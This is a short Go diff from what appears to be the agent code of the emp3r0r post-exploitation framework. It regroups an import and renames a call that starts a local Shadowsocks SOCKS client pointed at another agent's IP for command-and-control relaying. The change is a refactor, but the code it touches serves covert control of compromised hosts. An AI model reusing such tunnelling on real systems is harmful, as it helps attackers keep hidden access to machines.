@@ -7,11 +7,12 @@ import (
 	"encoding/binary"
 	"fmt"
 	"hash/crc32"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"net/url"
 	"sync"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -199,7 +200,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		// Check if local Shadowsocks client is running
 		if !netutil.IsPortOpen("127.0.0.1", common.RuntimeConfig.ShadowsocksLocalSocksPort) {
 			logging.Printf("BroadcastServer: starting Shadowsocks client for %s", srcIP)
-			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
+			go c2transport.StartLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
 			// give it some time to start
 			time.Sleep(1 * time.Second)
 		}
@@ -213,7 +214,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			logging.Printf("BroadcastServer: proxy %s failed, restarting Shadowsocks client pointing to %s", proxy_url, srcIP)
 			c2transport.SS_Cancel()
 			c2transport.SS_Ctx, c2transport.SS_Cancel = context.WithCancel(context.Background())
-			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
+			go c2transport.StartLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
 			// give it some time to start
 			time.Sleep(1 * time.Second)
 		}
